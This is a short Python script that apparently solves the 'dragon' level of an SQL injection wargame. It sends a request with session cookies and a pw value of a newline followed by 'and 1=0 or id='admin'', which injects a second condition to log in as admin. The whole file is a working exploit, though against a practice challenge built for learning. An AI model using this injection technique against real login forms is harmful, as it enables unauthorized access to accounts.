import requests

url = 'https://los.eagle-jump.org/dragon_7ead3fe768221c5d34bc42d518130972.php'
cookies = {
	'__cfduid': 'd62a30e224aba27b08a35b2947d911a1e1545226254',
	'PHPSESSID': '0unh7g2sdhsat0o51g7r69c2m1'
}
payloads = {
	'pw': ''
}

payloads['pw'] = '\nand 1=0 or id=\'admin'

res = requests.get(url, cookies=cookies, params=payloads)
print(res.text)